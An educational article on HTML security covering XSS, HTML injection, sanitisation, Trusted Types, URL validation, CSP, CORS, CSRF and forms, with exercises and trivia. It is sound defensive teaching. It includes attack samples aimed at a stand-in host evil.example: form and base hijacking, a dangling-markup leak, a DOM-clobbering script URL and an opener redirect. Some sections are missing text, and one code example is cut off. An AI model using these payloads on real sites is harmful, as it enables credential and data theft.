HTML Security

How markup becomes an attack surface, and how to close it: cross-site scripting and HTML injection; rendering untrusted HTML, safe DOM manipulation, URL validation and user-generated content; the browser defences that back them up (Content Security Policy, iframe sandboxing, rel="noopener" and rel="noreferrer", mixed-content blocking and clickjacking protection); how CORS fits in; and how to secure forms. Grounded in the WHATWG HTML, DOM, URL and Fetch standards, the W3C Web Application Security specifications, OWASP and MDN.

Updated 15 November 2026123 references (Vancouver style)Includes exercises, trivia, live attack-and-defence demos, a security lab and a playground

The previous article in this series showed how scripts read and change the DOM. That power is exactly what an attacker wants. If text typed by one user can reach another user's page as markup, it can add elements, run scripts and act with that user's session; and every feature covered in earlier parts, from links to forms and embedded media, has a security side. Injection, which includes cross-site scripting, is category A05 of the 2025 OWASP Top 10, and cross-site scripting (CWE-79) is ranked first in MITRE's 2025 list of the most dangerous software weaknesses.1–3

The article follows the outline in the table of contents. Section 2 covers injection: cross-site scripting and plain HTML injection. Section 3 is about the code you write to handle untrusted data: rendering HTML, manipulating the DOM safely, validating URLs and handling user-generated content. Section 4 covers the defences that the browser enforces once you ask for them, and how CORS relates to them. Section 5 is about forms. Section 6 assembles everything into a hardened comment widget, and sections 7 to 11 hold exercises, trivia, a security lab, a playground and a quick reference. The demos run attack payloads only inside sandboxed frames with an opaque origin, so they cannot reach this page.4,5

1Introduction

1.1 Why HTML is an attack surface

An HTML document mixes three kinds of content in one stream of characters: data (text), structure (tags and attributes) and code (scripts, event handler attributes, javascript: URLs and style). The parser decides which is which purely from the characters it sees.8 A web application usually builds that stream by joining fixed template text with values that came from somewhere else: a database row, a URL parameter, another user's comment. Whenever a value is allowed to contain characters such as <, " or & without being encoded, it can stop being data and become structure or code. That is the root cause of injection, and OWASP's definition of the category is exactly this: untrusted input sent to an interpreter as part of a command or query.2,9

The browser cannot tell which bytes the developer meant and which an attacker smuggled in; to the parser, a <script> element in a comment field is just as legitimate as one in the template. So the responsibility is split. The application must keep untrusted data in a data context, using encoding, sanitising and safe APIs, and the page should also ask the browser to enforce policies (Content Security Policy, sandboxing, framing rules and so on) that limit the damage if the application gets it wrong.6,10

1.2 The same-origin policy

Every defence in this article is built on one rule. An origin is the triple of scheme, host and port of a URL, for example ("https", "shop.example", 443).23,24 The same-origin policy lets a document freely read and change documents, storage and responses from its own origin, but restricts its access to other origins: it can embed cross-origin images, scripts and frames and send requests to other origins, but generally cannot read what comes back.24,25 Cookies are an exception that matters for security: they are scoped by domain and path rather than by origin, and by default the browser attaches them to every request to their site, including requests that another site triggers.26,27

The consequence is the most important idea in web security: whoever can run script in your origin is you. The same-origin policy keeps other sites out, but it has nothing to say about script that arrives inside your own page. Cross-site scripting is therefore not a weakness in the policy; it is a way around it.6,29

1.4 A short history

The name "cross-site scripting" was settled in January 2000 by a small group of Microsoft security engineers investigating the problem, ahead of an advisory coordinated with CERT in early February of that year.42 The term stuck even though most XSS today involves no second site at all. On 4 October 2005 Samy Kamkar released a self-propagating script on MySpace that added him as a friend to everyone who viewed an infected profile, and copied itself to theirs; by his own account it reached more than one million users in under 20 hours.43 It is usually cited as the first major XSS worm, and it showed that one injection bug could compromise a whole social network.

Browser-enforced defences followed. Microsoft introduced the X-Frame-Options response header in Internet Explorer 8 as a defence against clickjacking, and the IETF later documented it as RFC 7034 in October 2013.41,44 Mozilla announced Content Security Policy in June 2009 as a way to "shut down" XSS by declaring which scripts a page may run.45 CSP Level 2 became a W3C Recommendation on 15 December 2016, and Level 3 is still being developed.10,38 A 2016 Google study of real policies found bypasses in 94.72% of distinct policies, mostly because they relied on host allowlists, which led to today's recommended "strict" CSP based on nonces and hashes.46,47 The latest additions move the protection into the DOM itself: Trusted Types, which has worked in all major browsers since February 2026, and a built-in HTML sanitizer, now specified in the HTML Standard.33,48

1.5 Defence in depth

No single control is enough. Encoding can be forgotten in one template; a sanitizer can have a bug; a CSP can be too loose. Security guidance therefore recommends layers, each of which assumes the one before it may fail.6,50 For HTML, the layers run from the server that stores data to the browser that renders it.

2Injection

2.1 Cross-site scripting (XSS)

Cross-site scripting is the injection of attacker-controlled script into a page that other users view. MITRE defines it as a failure to neutralise user-controllable input before it is placed in output that is used as a web page served to other users.9 Because the script runs with the page's origin, it can do anything the user could do on that site: read the DOM, including CSRF tokens and personal data; send authenticated requests with the user's cookies; change what the user sees; and capture keystrokes on the page.6,29 The only thing it cannot do directly is read cookies marked HttpOnly, which is one reason session cookies should carry that attribute.26,52

XSS is usually divided by where the payload is stored and where it is inserted into the page.29,53

The first two were described from the start; Amit Klein named the third, DOM-based XSS, in 2005.53 OWASP now also groups them as server XSS and client XSS, depending on whether the unsafe insertion happens in server-side templates or in browser code, because the defence differs: server templates need output encoding, client code needs safe DOM APIs.53,54

Script tags are only one way in. Anything that the HTML parser or the browser treats as code is an XSS vector: event handler content attributes such as onerror, onload and onfocus; javascript: URLs in href, action, formaction or src of an iframe; srcdoc; SVG and MathML content; and, in older browsers, CSS expressions.7,55,56 That is why filtering out the string <script never works.

The primary defence against XSS is contextual output encoding: converting characters that are special in the place where a value is inserted into a form that the parser reads as data.6 "The place" matters. 2.3 HTML injection

HTML injection is the same flaw without the script: the attacker can insert markup but script is blocked, perhaps by a sanitizer that removes handlers or by a CSP. That is still dangerous.11,12 Common forms:

  • Content spoofing and phishing. A fake login form, "Your session has expired" banner or <meta http-equiv="refresh"> redirect, shown on the trusted domain.11,61
  • Form hijacking. An injected <form action="https://evil.example"> placed before a real form's fields, or a <button formaction>, sends the user's input to the attacker. Browsers and password managers may autofill credentials into it.62,63
  • Base hijacking. An injected <base href="https://evil.example/"> changes how every later relative URL resolves, including <script src="app.js">.64,65
  • Dangling markup. An unclosed attribute such as <img src='https://evil.example/? swallows the following page text, up to the next matching quote, into a URL that the browser requests, leaking CSRF tokens or personal data. Chrome mitigates the classic form by refusing such URLs that contain raw newlines and <.12
  • DOM clobbering. Elements with id or name attributes create global variables and document properties with the same name, so <a id="config" href="…"> can replace a script's expected window.config object.66,67
Example 2. DOM clobbering: markup that overrides a variableHTML
<!-- injected by an attacker (no script, passes a naive filter) -->
<a id="defaultAvatar" href="https://evil.example/x.js"></a>
<pre id="out"></pre>
<script>

  const src = window.defaultAvatar || "/img/avatar.png";

An anchor element stringifies to its href, so the attacker's URL replaces the default. Avoid reading configuration from undeclared globals, declare variables with const or let (which named access cannot shadow), and check types with instanceof.66,67

The CSP directives that stop script-less attacksform-action 'self' limits where forms can submit, base-uri 'none' blocks injected <base> elements, and a tight img-src limits where dangling-markup URLs can go. The first two are not covered by the default-src fallback, so they must be listed explicitly (section 4.1).10,63,65

3Handling untrusted content

3.1 Untrusted HTML rendering

Encoding is right when a value should be shown as text. Sometimes, though, the application has to display HTML that it did not write: a rich-text comment, an e-mail body, a CMS article, a Markdown rendering or a third-party widget. Encoding would show the tags literally, so the HTML must instead be sanitized: parsed, stripped of everything not on an allowlist of safe elements and attributes, and serialised or inserted again.6,33

Writing a sanitizer with regular expressions is a well-known trap. HTML parsing is error-tolerant and full of special cases: tags are case-insensitive, attributes can be unquoted or separated by slashes, entities can encode letters in javascript:, and SVG and MathML switch the parser into different modes. A regex sees none of that.7,8 Worse, markup that looks safe after one parse can change meaning when it is serialised and parsed again. Heiderich and colleagues called this mutation-based XSS (mXSS) and showed attacks against widely used sanitizers and web mail clients in 2013.49 A safe sanitizer therefore parses with the browser's own parser and, ideally, inserts the resulting DOM nodes rather than a re-serialised string.33,68

The HTML Standard now defines two families of methods. setHTML() and Document.parseHTML() always remove script-capable content, whatever configuration you pass. Their "unsafe" counterparts, setHTMLUnsafe() and Document.parseHTMLUnsafe(), parse without sanitizing unless you supply a sanitizer, and exist mainly to support declarative shadow DOM.33,70,71 Support for setHTML() is still limited across browsers, so feature-detect it and fall back to a library.69

Sanitizing with the platform, falling back to DOMPurifyJS
function renderComment(el, untrustedHTML) {
  if ("setHTML" in Element.prototype) {
    // Removes scripts, handlers, javascript: URLs and other unsafe content
    el.setHTML(untrustedHTML, {
      sanitizer: { elements: ["p", "br", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code", "pre", "blockquote"] }
    });
  } else {
    el.innerHTML = DOMPurify.sanitize(untrustedHTML, {
      ALLOWED_TAGS: ["p", "br", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code", "pre", "blockquote"],
      ALLOWED_ATTR: ["href"]
    });
  }
}

DOMPurify, maintained by the security firm Cure53, describes itself as a "DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG", and its project notes that it inspired the HTML Sanitizer API.68 Whatever you use, sanitize at the moment of output, with the configuration for that output, rather than once on input: data that is safe in a paragraph may not be safe in an attribute, and sanitizers improve over time.6

3.2 Safe DOM manipulation

DOM-based XSS happens when JavaScript moves data from a source the attacker can influence to a sink that interprets it as code or markup.29,54 Sources include location (especially hash and search), document.referrer, window.name, postMessage data, Web Storage and any response from an API that stores user content. Trusted Types

Reviewing every sink by hand does not scale. Trusted Types lets a page tell the browser to refuse plain strings at dangerous sinks. With the CSP directive require-trusted-types-for 'script', assigning a string to innerHTML, script.src, eval() and the other injection sinks throws a TypeError; only TrustedHTML, TrustedScript and TrustedScriptURL objects, created by named policies that you write and review, are accepted.36,48 This turns "find every unsafe assignment" into "review the few policies". Trusted Types has been Baseline, working across the latest versions of all major browsers, since February 2026.48

Enforcing Trusted Types with one reviewed policyJS
// Response header (or <meta http-equiv="Content-Security-Policy">):
//   Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html

const appHTML = trustedTypes.createPolicy("app-html", {
  createHTML: (s) => DOMPurify.sanitize(s)   // the only place HTML is turned into markup
});

el.innerHTML = location.hash;                 // TypeError: requires a TrustedHTML value
el.innerHTML = appHTML.createHTML(comment);   // allowed, and sanitized
el.textContent = location.hash;               // not a sink: always allowed

Policies are the only places where strings become markup or code, so a security review can concentrate on them. Kotowicz's guide recommends starting with Content-Security-Policy-Report-Only to collect violations from existing code before enforcing.48,78

3.3 URL validation

URLs deserve their own section because HTML-encoding a URL does not make it safe. javascript:alert(1) contains no special HTML characters, and following a link or loading a frame with that URL runs the code in the current page's origin.6,56 The URL parser is also more forgiving than most people expect: it strips leading and trailing spaces and control characters, removes tabs and newlines anywhere, and lower-cases the scheme, so " JaVa&Tab;script:alert(1)" is still a javascript: URL.7,13

The reliable approach is to parse with the same parser the browser uses, then allowlist. The URL constructor implements the URL Standard parser; URL.canParse() and URL.parse() test without throwing.13,79

A safe URL validatorJS
const SAFE_SCHEMES = new Set(["https:", "http:", "mailto:"]);

function safeURL(input, base = location.href) {
  const url = URL.parse(input, base);           // null if it cannot be parsed
  if (!url || !SAFE_SCHEMES.has(url.protocol)) return "about:blank";
  return url.href;                              // normalised, absolute
}

// For redirects after login: allow only your own origin

3.4 Secure handling of user-generated content


User-generated content (comments, profiles, reviews, uploads, messages) is where stored XSS lives. It needs a pipeline in which each stage has a single job.6,51





    

  • Validate input, but do not rely on it. Check length, type and format with an allowlist on the server (client-side checks are for convenience only). Validation reduces the attack surface but is not an XSS defence on its own, because a valid name such as O'Brien still contains a special character.51
    • 

  • Store the original, encode on output. Pre-encoding data before storing it leads to double encoding in one place and missing encoding in another (an e-mail, a JSON API, a PDF). Encode at the point where the output context is known.6
    • 

  • Prefer a restricted markup language. Markdown is not safe by itself: most renderers pass raw HTML through and accept [x](javascript:…). Disable raw HTML in the renderer and sanitize its output anyway.6
    • 

  • Qualify links. Mark links in user content with rel="ugc" (or nofollow), which tells search engines not to treat them as endorsements and removes much of the incentive for link spam.82,83 Add noopener to those that open new tabs (section 4.3).
    • 

  • Isolate uploaded files. OWASP's first recommendation is to store uploaded files on a different host.81 Serve them from a separate origin (many large sites use a dedicated "user content" domain), with Content-Disposition: attachment for anything that should not render, and X-Content-Type-Options: nosniff so a browser does not reinterpret an "image" as HTML.84,85 SVG files are XML documents that can contain script, so treat them as active content, not as images.86
    • 

  • Limit the blast radius. Session cookies should be HttpOnly, Secure and SameSite; sensitive actions should require re-authentication.31,52
    •

4.3 rel="noopener"


A page opened from a link with target="_blank", or with window.open(), historically received a reference to the page that opened it in window.opener. Even across origins, it could use that reference to navigate the opener: window.opener.location = "https://evil.example/login". 4.5 Mixed content


A page delivered over HTTPS that loads sub-resources over plain HTTP has mixed content. Those HTTP requests can be read and modified by anyone on the network path, so a single <script src="http://…"> undoes the protection of the whole page: an attacker on public Wi-Fi can replace the script.17,101 The Mixed Content specification divides it into two kinds.17


    

  • Upgradeable content: images, audio and video. Browsers rewrite the URL to https: automatically and block it if the upgrade fails. Chrome adopted this for audio and video in version 80 and later for images.17,102
    • 

  • Blockable content: everything else, including scripts, stylesheets, frames, fetch() and fonts. It is blocked outright.17,101
    • 



Forms that submit to http: URLs from an HTTPS page are also treated as insecure, and browsers warn before sending them.101 To fix mixed content, change URLs to https: (or relative URLs), add upgrade-insecure-requests to the CSP while migrating legacy content, and send Strict-Transport-Security (HSTS) so the browser never connects to your site over HTTP again for the declared period.18,39,103

4.7 How CORS relates to HTML security


Cross-Origin Resource Sharing (CORS) is the protocol, defined in the Fetch Standard, by which a server tells the browser that pages from other origins may read its responses.28,109 It is often misunderstood as a security feature that protects servers. It is the opposite: CORS relaxes the same-origin policy. The policy itself is the protection; CORS headers are holes that a server deliberately opens.25,109





Five consequences matter for HTML:


    

  1. CORS does not stop CSRF. A cross-origin request with a CORS-safelisted method (GET, HEAD or POST) and only safelisted headers and content types (application/x-www-form-urlencoded, multipart/form-data, text/plain) is sent without a preflight. An HTML form can send exactly that kind of request, with cookies, so CSRF defences are needed regardless of CORS (section 5.1).21,28,111
    2. 

  2. CORS does not stop XSS. Injected script runs in your origin, so all your same-origin APIs are open to it with no CORS involved (Figure 1).25,29
    3. 

  3. Misconfigured CORS is a vulnerability. Reflecting any Origin back in Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true lets every site read your users' private data. The wildcard * cannot be combined with credentials, precisely to prevent that.28,109
    4. 

  4. The crossorigin attribute. On img, script, link, audio and video, crossorigin="anonymous" (or "use-credentials") makes the element's request a CORS request. That is required to read the pixels of a cross-origin image drawn on a canvas (otherwise the canvas is "tainted"), to check Subresource Integrity on cross-origin scripts, and to see the details of errors in cross-origin scripts.76,112–114
    5. 

  5. Subresource Integrity. <script src="https://cdn.example/lib.js" integrity="sha384-…" crossorigin="anonymous"> makes the browser refuse the file if a compromised CDN changes it.76
    6.

Forms are where users hand data to your application, so they combine several of the threats above: they can be forged from another site, hijacked by injected markup, framed for clickjacking and submitted over insecure connections.21,115



5.1 Cross-site request forgery (CSRF)


In a cross-site request forgery, a page on another site makes the victim's browser send a request to your site. Because the browser attaches your site's cookies, the request arrives authenticated, and if your server acts on it, the attacker has changed the victim's e-mail address, made a purchase or deleted data without ever seeing a response.21,22,116 CSRF is ranked third in MITRE's 2025 Top 25.3 It needs no injection, only an ordinary HTML form on the attacker's page:

  • Fetch Metadata. Browsers send Sec-Fetch-Site: cross-site (or same-site, same-origin, none) with requests, letting the server reject state-changing requests from other sites with a single rule.21,40

After login, /login?next=… redirects to next. Which of these does next.startsWith("/") wrongly accept, and how do you fix it?


  1. /account
  2. //evil.example
  3. /\evil.example
  4. https://evil.example


Show solution


It accepts (a), (b) and (c); only (a) is safe. (b) is a scheme-relative URL to another host. (c) works because the URL parser treats a backslash like a slash in http and https URLs, so /\evil.example also resolves to evil.example. Fix it by parsing and comparing origins: URL.parse(next, location.origin)?.origin === location.origin.13,14,80









Exercise 5: Review a CSP


What is wrong with this policy?


Exercise 5HTTP
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example https:; img-src *


Show solution


'unsafe-inline' without a nonce or hash allows injected inline scripts and handlers, which defeats the point. https: allows scripts from any HTTPS host, including an attacker's. Host allowlists such as https://cdn.example are often bypassable through JSONP or old libraries. base-uri, form-action and frame-ancestors are missing and do not fall back to default-src. A better policy: script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'self'. Check it with the CSP analyser.10,46,47









Exercise 6: Sandbox an embed


You must embed a third-party HTML widget, served from https://widgets.example, that needs JavaScript and occasionally opens links in a new tab. It must not navigate your page or show alerts. Write the iframe.


Show solution


Solution 6HTML
<iframe src="https://widgets.example/w/42"
        sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"
        referrerpolicy="strict-origin-when-cross-origin"
        title="Weather widget" loading="lazy"></iframe>


Without allow-same-origin the widget runs in an opaque origin and loses access to its own cookies; add it only if the widget needs them, which is acceptable here because the widget is on a different origin from your page. Leaving out allow-top-navigation and allow-modals blocks navigation of your page and alerts.30,91









Exercise 7: Tabnabbing


A page contains <a href="https://partner.example" target="partnerwin">. Is it protected from reverse tabnabbing in a modern browser? What about window.open("https://partner.example")?


Show solution


Neither is protected automatically. The implicit noopener applies only to target="_blank"; a named target such as partnerwin still gets an opener, so add rel="noopener". window.open() needs the "noopener" feature (window.open(url, "_blank", "noopener")). Cross-Origin-Opener-Policy: same-origin protects both cases.16,93,95









Exercise 8: Leaky referrer


A password-reset page at https://shop.example/reset?token=abc includes an analytics script from https://stats.example and a "Help" link to https://help.vendor.example. Under the default referrer policy, what does each receive in Referer? How do you make sure the token never leaks?


Show solution


With strict-origin-when-cross-origin, both receive only https://shop.example/, so the token does not leak by default. But a page that weakens the policy (for example unsafe-url) would leak it, and the token is still in the history and server logs. Set Referrer-Policy: no-referrer on the reset page, put the token in a POST body or exchange it for a cookie on first use, and redirect to a URL without it.35,100









Exercise 9: CORS or CSRF?


A colleague says: "Our API sends no CORS headers, so other sites cannot call POST /api/delete-account." Are they right?


Show solution


No. Missing CORS headers only stop other sites from reading the response. If the endpoint accepts a form-encoded or text/plain body, an HTML form on another site can send the request without a preflight, with the user's cookies unless they are SameSite, and the account is deleted. Require a CSRF token or a custom header plus JSON content type, check Sec-Fetch-Site and use SameSite cookies.21,28,111









Exercise 10: Clickjacking audit


A settings page sends X-Frame-Options: ALLOW-FROM https://partner.example and nothing else. What happens in a current browser, and what should it send?


Show solution


ALLOW-FROM is obsolete and not supported by modern browsers, so the page may be framable by anyone, depending on the browser. Send Content-Security-Policy: frame-ancestors 'self' https://partner.example and optionally X-Frame-Options: SAMEORIGIN for older browsers; where both are present, frame-ancestors wins.10,106,108








8Trivia questions


    

  1. Why is it called "cross-site" scripting when most attacks involve one site?
    Answer
    The name was chosen in January 2000 by Microsoft engineers studying attacks in which a malicious site injected script into another site through crafted links; it stuck even as stored and DOM-based variants made the second site unnecessary.42
    2. 

  2. How fast did the 2005 Samy worm spread on MySpace?
    Answer
    To more than one million users in under 20 hours, according to its author.43
    3. 

  3. Does a <script> element inserted with innerHTML run?
    Answer
    No. The HTML Standard says scripts inserted by innerHTML, outerHTML or insertAdjacentHTML() do not execute, which is why payloads use onerror and similar handlers.57
    4. 

  4. What rank does cross-site scripting have in MITRE's 2025 CWE Top 25?
    Answer
    First (CWE-79). CSRF (CWE-352) is third.3
    5. 

  5. Which browser introduced X-Frame-Options?
    Answer
    Internet Explorer 8, announced on the IE blog in January 2009; RFC 7034 documented it in October 2013.41,44
    6. 

  6. Which organisation first announced Content Security Policy?
    Answer
    Mozilla, in a June 2009 post titled "Shutting Down XSS with Content Security Policy".45
    7. 

  7. What share of distinct CSPs could be bypassed in the 2016 "CSP Is Dead, Long Live CSP!" study?
    Answer
    94.72%.46
    8. 

  8. Why can CSS not steal a CSP nonce with script[nonce^="a"] selectors?
    Answer
    When the policy arrives in a response header, browsers hide the nonce: once the element is inserted, the content attribute's value is cleared and the nonce is kept in an internal slot, available only through the nonce IDL property.89
    9. 

  9. How many keywords does the sandbox attribute accept?
    Answer
    Thirteen, from allow-downloads to allow-top-navigation-to-custom-protocols.30
    10. 

  10. Is Referer a typo?
    Answer
    Yes, a historical misspelling of "referrer" that is now part of the HTTP standard. The newer Referrer-Policy header is spelled correctly.35,97
    11. 

  11. Which link type implies another one?
    Answer
    noreferrer implies noopener.98,99
    12. 

  12. Which three request methods are CORS-safelisted?
    Answer
    GET, HEAD and POST.111
    13. 

  13. Which older response header does the CSP frame-ancestors directive replace?
    Answer
    X-Frame-Options; when both are sent, frame-ancestors takes precedence.10,108
    14. 

  14. What is mXSS?
    Answer
    Mutation-based XSS: markup that is harmless when sanitized but changes into a working payload when the browser serialises and re-parses it, described by Heiderich et al. in 2013.49
    15. 

  15. What does rel="ugc" tell search engines?
    Answer
    That the link is in user-generated content such as comments or forum posts.82
    16. 

  16. Which project inspired the HTML Sanitizer API?
    Answer
    DOMPurify, by Cure53, according to its own documentation.68
    17. 

  17. Who named DOM-based XSS?
    Answer
    Amit Klein, in 2005.53
    18. 

  18. Since when has Trusted Types worked across the latest versions of all major browsers?
    Answer
    February 2026, when it became Baseline.48
